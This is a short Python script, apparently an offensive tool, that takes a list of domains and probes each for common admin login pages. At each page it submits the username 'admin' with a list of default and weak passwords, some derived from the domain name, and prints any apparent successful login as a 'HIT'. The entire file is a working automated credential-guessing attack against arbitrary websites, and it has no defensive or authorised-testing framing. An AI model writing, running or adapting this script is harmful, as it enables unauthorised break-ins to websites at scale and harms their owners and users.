import urllib.request,re,time,sys

domains = [l.strip() for l in open(sys.argv[1]) if l.strip()]
for d in domains:
    try:
        req = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
        urllib.request.urlopen(req, timeout=4)
        name = d.split(".")[0]
        for p in ["/admin","/login","/admin/login","/admin.php"]:
            try:
                req2 = urllib.request.Request("http://"+d+p, headers={"User-Agent":"Mozilla/5.0"})
                h2 = urllib.request.urlopen(req2, timeout=4).read()
                s2 = len(h2)
                if 200 < s2 < 60000:
                    for pw in ["admin","123456","admin123",name,name+"123","admin888"]:
                        import urllib.parse
                        data = urllib.parse.urlencode({"username":"admin","password":pw}).encode()
                        req3 = urllib.request.Request("http://"+d+p, data=data, headers={"User-Agent":"Mozilla/5.0"})
                        try:
                            h3 = urllib.request.urlopen(req3, timeout=4).read()
                            s3 = len(h3)
                            if s3 != s2 and s3 > 3000:
                                print("HIT:"+d+"|"+p+"|"+pw+"|"+str(s3)+"B")
                                break
                        except: pass
            except: pass
    except Exception as e:
        pass
